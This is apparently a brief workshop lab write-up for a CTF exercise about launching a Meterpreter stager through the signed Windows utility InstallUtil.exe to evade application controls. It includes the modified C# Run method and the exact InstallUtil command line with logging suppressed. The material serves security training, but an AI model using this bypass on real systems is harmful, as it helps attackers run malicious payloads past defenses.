## Lab 3


### CTF 2: Modify Exercise 2’s source code to obtain a meterpreter shell by abusing InstallUtil.exe
The goal of this is to "live off the land" using a legitimate signed windows utility to load our payload. 

This was accomplished by modifying the run Method, and pointing the process start method to the custom stager serving the meterpreter payload used in Lab 2:

```c#
public static void Run()
    {
        //Process.Start("notepad.exe");
        Process.Start("C:\\Users\\User\\Desktop\\defcon27_csharp_workshop-master\\Labs\\lab2\\2.exe");
	Console.ReadKey();
    }
```

And then using the following command:
```
c:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile=/LogToConsole=false /U 2.exe
```
